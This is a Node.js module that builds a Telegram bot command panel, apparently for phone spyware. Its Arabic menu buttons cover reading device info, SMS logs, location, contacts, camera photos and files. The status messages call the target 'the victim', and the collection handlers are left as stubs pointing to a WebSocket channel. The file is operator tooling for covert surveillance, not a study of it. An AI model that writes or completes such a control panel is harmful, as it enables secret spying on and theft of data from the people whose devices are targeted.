const TelegramBot = require('node-telegram-bot-api');

const setupBot = () => {
  const token = process.env.TELEGRAM_TOKEN;
  const adminId = process.env.ADMIN_CHAT_ID;

  if (!token) {
    throw new Error("TELEGRAM_TOKEN is missing");
  }

  const bot = new TelegramBot(token, { polling: true });

  // دالة لإنشاء لوحة التحكم (الأزرار)
  const getControlPanel = () => {
    return {
      reply_markup: {
        keyboard: [
          ['📱 معلومات الجهاز', '💬 سجل الرسائل'],
          ['📍 تحديد الموقع', '📞 جهات الاتصال'],
          ['📸 التقاط صورة', '📂 سحب ملفات']
        ],
        resize_keyboard: true
      }
    };
  };

  console.log("Control Panel Bot is initializing...");

  // عند إرسال /start تظهر الأزرار
  bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() === adminId.toString()) {
      bot.sendMessage(msg.chat.id, "✅ أهلاً بك في لوحة تحكم السيرفر.\nاختر أمراً من القائمة بالأسفل:", getControlPanel());
    } else {
      bot.sendMessage(msg.chat.id, "⚠️ عذراً، أنت لست الآدمن.");
    }
  });

  // التعامل مع ضغطات الأزرار
  bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (msg.chat.id.toString() !== adminId.toString()) return;

    switch (msg.text) {
      case '📱 معلومات الجهاز':
        bot.sendMessage(chatId, "⏳ جارٍ طلب معلومات الجهاز من الضحية...");
        // هنا يتم إرسال أمر للـ WebSocket
        break;
      case '💬 سجل الرسائل':
        bot.sendMessage(chatId, "⏳ جارٍ سحب سجل الـ SMS...");
        break;
      case '📍 تحديد الموقع':
        bot.sendMessage(chatId, "⏳ جارٍ تحديد إحداثيات الموقع...");
        break;
      // يمكنك إضافة بقية الحالات هنا
    }
  });

  return bot;
};

module.exports = { setupBot };
